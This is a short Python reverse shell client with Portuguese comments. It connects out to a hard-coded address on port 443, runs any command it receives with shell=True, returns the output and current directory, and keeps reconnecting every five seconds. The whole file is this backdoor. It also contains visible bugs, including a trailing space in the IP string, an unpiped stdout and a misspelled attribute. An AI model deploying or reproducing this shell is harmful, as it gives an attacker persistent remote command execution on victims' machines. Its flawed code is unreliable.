import socket
import subprocess
import sys
import os

ip = '192.168.1.37 ' # endereço onde o ip será conectado 
port = 443 


def connenct(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send('[ ! ] Connected\n')
        return s
    except Exception as error:
        print('Erro de conexao', error)
        return None


def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if data[:-1] == '/exit':
                s.close()
                sys.exit(0)
            else:
                cmd(s, data[:-1])
    except:
        error(s)


def cmd(s, data):
    try:
        proc = subprocess.Popen(
            data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read() + proc.sterr.read() + os.getcwd() + '>'
        s.send(output+'\n')
    except:
        error(s)


def error(s):
    if s:
        s.close()
    main()


def main():
    from time import sleep
    while True:
        s_connected = connenct(ip, port)
        if s_connected:
            listen(s_connected)
        else:
            sleep(5)


# Principal program
if __name__ == '__main__':
    main()
